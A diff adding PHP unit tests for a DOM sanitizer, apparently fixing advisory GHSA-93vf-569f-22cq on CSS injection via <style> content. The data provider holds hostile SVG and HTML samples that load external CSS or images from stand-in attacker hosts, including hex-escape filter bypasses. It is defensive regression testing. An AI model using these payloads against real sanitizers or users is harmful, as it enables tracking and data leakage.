@@ -455,6 +455,94 @@ final class DomSanitizerTest extends TestCase
         ];
     }
 
+    // =========================================================================
+    // GHSA-93vf-569f-22cq: CSS injection via <style> text content
+    // =========================================================================
+
+    /**
+     * @dataProvider providerDangerousStyleContent
+     */
+    public function testDangerousStyleContentStripped(int $mode, string $input, string $description): void
+    {
+        $sanitizer = new DOMSanitizer($mode);
+        $output = $sanitizer->sanitize($input);
+
+        $this->assertStringNotContainsString('attacker.example', $output, "Failed: $description");
+        $this->assertStringNotContainsString('evil.example', $output, "Failed: $description");
+        $this->assertStringNotContainsString('@import', $output, "Failed: $description");
+    }
+
+    public static function providerDangerousStyleContent(): array
+    {
+        return [
+            [
+                DOMSanitizer::SVG,
+                '<svg xmlns="http://www.w3.org/2000/svg"><style>* { background: url("https://attacker.example/c"); }</style></svg>',
+                'SVG <style> with quoted external url() should be dropped',
+            ],
+            [
+                DOMSanitizer::SVG,
+                '<svg xmlns="http://www.w3.org/2000/svg"><style>* { background: url(https://attacker.example/c); }</style></svg>',
+                'SVG <style> with unquoted external url() should be dropped',
+            ],
+            [
+                DOMSanitizer::SVG,
+                '<svg xmlns="http://www.w3.org/2000/svg"><style>@import url(https://attacker.example/evil.css);</style></svg>',
+                'SVG <style> with @import url() should be dropped',
+            ],
+            [
+                DOMSanitizer::SVG,
+                '<svg xmlns="http://www.w3.org/2000/svg"><style>@import "https://attacker.example/evil.css";</style></svg>',
+                'SVG <style> with quoted @import should be dropped',
+            ],
+            [
+                DOMSanitizer::SVG,
+                '<svg xmlns="http://www.w3.org/2000/svg"><style>body { background: url(//evil.example/x); }</style></svg>',
+                'SVG <style> with protocol-relative url() should be dropped',
+            ],
+            [
+                DOMSanitizer::SVG,
+                '<svg xmlns="http://www.w3.org/2000/svg"><style>* { background: \75 rl(https://attacker.example/x); }</style></svg>',
+                'SVG <style> with CSS hex-escape bypass should be dropped',
+            ],
+            [
+                DOMSanitizer::SVG,
+                '<svg xmlns="http://www.w3.org/2000/svg"><style>\40 import url(https://evil.example/e.css);</style></svg>',
+                'SVG <style> with CSS hex-escaped @import should be dropped',
+            ],
+            [
+                DOMSanitizer::HTML,
+                '<div><style>body { background: url(https://attacker.example/x); }</style></div>',
+                'HTML <style> with external url() should be dropped',
+            ],
+        ];
+    }
+
+    /**
+     * Legitimate <style> content must survive sanitization, including
+     * fragment-only url(#id) references used by SVG defs/gradients/filters.
+     */
+    public function testLegitimateStyleContentPreserved(): void
+    {
+        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);
+
+        $fragment = '<svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g"/></defs><style>.cls { fill: url(#g); stroke: #000; }</style><rect class="cls"/></svg>';
+        $output = $sanitizer->sanitize($fragment);
+        $this->assertStringContainsString('<style>', $output, 'Fragment url(#id) style block must be preserved');
+        $this->assertStringContainsString('url(#g)', $output, 'Fragment reference must be preserved');
+
+        $plain = '<svg xmlns="http://www.w3.org/2000/svg"><style>.a { fill: red; stroke: #00f; font-family: sans-serif; }</style><rect class="a"/></svg>';
+        $output = $sanitizer->sanitize($plain);
+        $this->assertStringContainsString('<style>', $output, 'Plain style rules must be preserved');
+        $this->assertStringContainsString('fill: red', $output, 'Plain style rules must be preserved');
+
+        $htmlSanitizer = new DOMSanitizer(DOMSanitizer::HTML);
+        $html = '<div><style>.foo { color: red; }</style><p>ok</p></div>';
+        $output = $htmlSanitizer->sanitize($html);
+        $this->assertStringContainsString('<style>', $output, 'HTML plain style rules must be preserved');
+        $this->assertStringContainsString('color: red', $output, 'HTML plain style rules must be preserved');
+    }
+
     protected function assertEqualHtml($expected, $actual, $message = '')
     {
         $from = ['/\>[^\S ]+/s', '/[^\S ]+\</s', '/(\s)+/s', '/> </s'];
